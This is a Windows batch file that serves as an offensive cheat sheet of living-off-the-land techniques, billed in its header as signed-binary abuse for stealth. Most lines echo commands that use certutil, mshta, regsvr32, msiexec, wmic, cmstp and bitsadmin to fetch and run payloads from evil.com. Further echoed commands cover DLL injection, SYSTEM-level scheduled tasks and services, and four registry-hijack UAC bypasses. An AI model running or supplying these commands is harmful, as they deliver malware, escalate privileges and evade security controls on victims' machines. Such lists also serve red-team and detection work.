@echo off
REM ============================================
REM LOLBin_Toolkit.bat - Signed-binary abuse for stealth
REM All commands use only Microsoft-signed binaries
REM Output: %TEMP%\lol_*.log
REM ============================================

set "OUT=%TEMP%"

echo.
echo === DOWNLOAD/EXECUTE via LOLBins ===
echo.

echo --- 1. certutil.exe (download + execute) ---
echo certutil.exe -urlcache -split -f "https://evil.com/payload.exe" "%TEMP%\p.exe" && "%TEMP%\p.exe"

echo --- 2. mshta.exe (HTA from URL) ---
echo mshta.exe https://evil.com/payload.hta

echo --- 3. regsvr32.exe (Squiblydoo) ---
echo regsvr32.exe /s /n /u /i:https://evil.com/payload.sct scrobj.dll

echo --- 4. msiexec.exe ---
echo msiexec.exe /q /i https://evil.com/payload.msi

echo --- 5. wmic.exe (XSL download) ---
echo wmic.exe os get /format:"https://evil.com/payload.xsl"

echo --- 6. cmstp.exe (INF) ---
echo cmstp.exe /ni /s https://evil.com/payload.inf

echo --- 7. InstallUtil.exe ---
echo InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

echo --- 8. MSBuild.exe (inline c#) ---
echo C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe evil.csproj

echo --- 9. csi.exe (interactive c#) ---
echo C:\Program Files (x86)\MSBuild\csi.exe evil.csx

echo --- 10. mavinject.exe (DLL injection) ---
echo mavinject.exe PID /INJECTRUNNING c:\evil.dll

echo.
echo === EXECUTE / RUN (signed binary) ===
echo.

echo --- cmd.exe ---
cmd.exe /c whoami

echo --- bitsadmin (alt download) ---
echo bitsadmin /transfer "job" "https://evil.com/payload.exe" "%TEMP%\p.exe"

echo --- wscript.exe (signed) ---
echo wscript.exe payload.vbs

echo --- cscript.exe (signed) ---
echo cscript.exe payload.vbs

echo --- mshta vbscript: ---
echo mshta.exe vbscript:Execute("msgbox ""x""")

echo.
echo === BYPASS / EXECUTE IN BYPASSED CONTEXT ===

echo --- 1. runas /netonly (pass-the-ticket) ---
echo runas.exe /netonly /user:DOMAIN\USER cmd.exe

echo --- 2. schtasks /create /ru SYSTEM (auto-elevate) ---
echo schtasks.exe /create /tn "x" /tr "cmd.exe" /sc once /st 00:00 /ru SYSTEM
echo schtasks.exe /run /tn "x"

echo --- 3. Scheduled task with SYSTEM auto-elevate ---
echo schtasks.exe /create /tn "x" /tr "C:\Users\Public\payload.exe" /sc minute /mo 1 /ru SYSTEM /f

echo --- 4. Direct SYSTEM shell via sc.exe (signed) ---
echo sc.exe create "x" binPath= "cmd /c start cmd" start= demand
echo sc.exe start "x"

echo.
echo === UAC BYPASS (auto-elevate to admin from medium integrity) ===

echo --- 1. fodhelper.exe (Win10+) ---
echo reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "cmd.exe" /f
echo fodhelper.exe

echo --- 2. eventvwr.exe (Vista+) ---
echo reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "cmd.exe" /f
echo eventvwr.exe

echo --- 3. computerdefaults.exe (Win10 1803+) ---
echo reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "cmd.exe" /f
echo computerdefaults.exe

echo --- 4. sdclt.exe (Win10 1709+) ---
echo reg add "HKCU\Software\Classes\Folder\shell\open\command" /ve /t REG_SZ /d "cmd.exe" /f
echo sdclt.exe

echo.
echo === Done ===
pause
